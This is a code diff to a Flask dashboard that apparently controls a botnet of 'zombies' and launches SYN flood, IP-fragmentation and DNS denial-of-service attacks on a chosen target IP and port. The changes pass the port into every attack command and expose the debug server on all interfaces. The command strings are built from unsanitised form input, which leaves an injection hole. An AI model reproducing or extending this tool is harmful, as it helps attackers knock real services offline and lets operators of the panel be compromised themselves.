@@ -48,11 +48,11 @@ def start_attack():
     port_str = request.form.get('port')
 
     try:
-        port = int(port_str) if port_str else None
+        port = int(port_str) if port_str else "None"
     except:
         return render_template('dashboard.html',error="Invalid port provided :/",number=zombies)
              
-    if attack_type == 'syn' and port is None:
+    if attack_type == 'syn' and port == "None":
         return render_template('dashboard.html',error="Port must be provided for SYN flood attacks.",number=zombies)
     
     return redirect(url_for('attack'))
@@ -85,9 +85,9 @@ def attack():
     if attack_type == 'syn':
         command = f" echo {target_ip} {port} syn | "
     if attack_type == 'ipfrag':
-        command = f" echo {target_ip} ipfrag | "
+        command = f" echo {target_ip} {port} ipfrag | "
     if attack_type == 'dns':
-        command = f" echo {target_ip} dns | "
+        command = f" echo {target_ip} {port} dns | "
 
     with open('zombies.txt', 'r') as f:
        for line in f:
@@ -99,4 +99,4 @@ def attack():
 
 
 if __name__ == '__main__': 
-    app.run(debug=True)
+    app.run(debug=True,host='0.0.0.0')
